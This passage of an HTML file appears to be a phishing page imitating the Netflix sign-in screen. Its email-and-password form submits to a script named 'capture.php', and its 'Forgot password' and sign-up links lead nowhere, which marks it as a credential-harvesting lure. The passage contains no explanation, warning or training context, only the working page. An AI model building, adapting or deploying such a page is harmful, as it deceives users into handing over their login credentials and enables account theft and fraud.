</style>
</head>
<body>
    <div class="login-container">
        <h1>Sign In</h1>
        <form action="./capture.php" method="POST" >
            <div class="form-group">
                <label for="email">Email or mobile number</label>
                <input type="text" id="email" name="email" placeholder="Email or mobile number" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-btn">Sign In</button>
            <div class="or-divider">OR</div>
            <div class="form-group">
                <button type="button" class="login-btn">Use a sign-in code</button>
            </div>
            <div class="extra-links">
                <a href="#">Forgot password?</a>
            </div>
            <div class="remember-me">
                <input type="checkbox" id="remember" name="remember">
                <label for="remember">Remember me</label>
            </div>
            <div class="extra-links">
                <span>New to Netflix? <a href="#">Sign up now.</a></span>
            </div>
        </form>
    </div>
</body>
</html>
